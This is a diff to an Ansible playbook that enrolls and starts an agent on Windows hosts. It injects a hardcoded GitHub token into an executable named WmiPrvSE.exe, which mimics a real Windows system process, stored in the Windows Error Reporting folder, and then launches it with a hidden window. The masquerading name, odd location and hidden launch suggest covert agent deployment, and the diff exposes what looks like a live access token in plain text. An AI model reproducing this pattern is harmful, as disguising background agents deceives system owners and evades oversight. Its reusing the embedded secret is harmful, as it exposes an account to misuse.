@@ -10,7 +10,7 @@
     target_dir: 'C:\ProgramData\Microsoft\Windows\WER'
     state_file: '{{ target_dir }}\state.json'
     
-    # ADD YOUR GITHUB TOKEN HERE
+    # PUT YOUR GITHUB TOKEN HERE
     github_token: "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"
 
   tasks:
@@ -29,16 +29,33 @@
         path: "{{ state_file }}"
       register: state_check
 
-    # --- IF NOT ENROLLED: PIPE THE TOKEN AND ENROLL ---
+    # --- IF NOT ENROLLED: FORCE A CONSOLE AND INJECT THE TOKEN ---
     - name: Launch agent and automatically pass the GitHub token
       ansible.windows.win_shell: |
-        # Pipe the token into the executable. 
-        # The executable will read this as if you typed it at the prompt.
-        "{{ github_token }}" | & "{{ target_dir }}\WmiPrvSE.exe" setup
+        $psi = New-Object System.Diagnostics.ProcessStartInfo
+        $psi.FileName = "{{ target_dir }}\WmiPrvSE.exe"
+        $psi.Arguments = "setup"
+        $psi.UseShellExecute = $false
+        $psi.RedirectStandardInput = $true
+        $psi.RedirectStandardOutput = $true
+        $psi.CreateNoWindow = $false
+        
+        $p = [System.Diagnostics.Process]::Start($psi)
+        Start-Sleep -Seconds 2
+        
+        $p.StandardInput.WriteLine("{{ github_token }}")
+        $p.StandardInput.Flush()
+        
+        $p.WaitForExit()
+        
+        if ($p.ExitCode -ne 0) {
+            Write-Error "Setup failed"
+            exit 1
+        }
       when: not state_check.stat.exists
 
-    # --- NOW ENROLLED: LAUNCH HIDDEN IN BACKGROUND ---
+    # --- IF ALREADY ENROLLED (OR JUST FINISHED): LAUNCH HIDDEN ---
     - name: Launch agent hidden in the background
       ansible.windows.win_shell: |
         Start-Process -FilePath "{{ target_dir }}\WmiPrvSE.exe" -ArgumentList "client" -WindowStyle Hidden
-      when: not state_check.stat.exists or state_check.stat.exists
+      when: state_check.stat.exists or not state_check.stat.exists
